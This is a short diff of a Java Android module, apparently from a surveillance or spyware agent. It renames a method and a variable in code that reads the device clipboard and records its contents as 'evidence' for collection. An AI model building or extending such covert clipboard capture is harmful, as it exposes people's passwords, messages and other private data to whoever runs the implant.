@@ -62,12 +62,12 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 					Check.log(TAG + " (run) fireAdminIntent");
 				}
 
-				realGo();
+				getClipboard();
 			}
 		});
 	}
 	
-	private void realGo() {
+	private void getClipboard() {
 		String ret = null;
 		
 		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
@@ -106,10 +106,10 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		
-		EvidenceBuilder logIncremental;
+		EvidenceBuilder evidence;
 		
 		synchronized (this) {
-			logIncremental = new EvidenceBuilder(EvidenceType.CLIPBOARD);
+			evidence = new EvidenceBuilder(EvidenceType.CLIPBOARD);
 		}
 		
 		items.add(tm);
@@ -119,12 +119,12 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
-			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
+			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
 		}
 		
 		synchronized (this) {
-			logIncremental.write(items);
-			logIncremental.close();
+			evidence.write(items);
+			evidence.close();
 		}
 	}
 
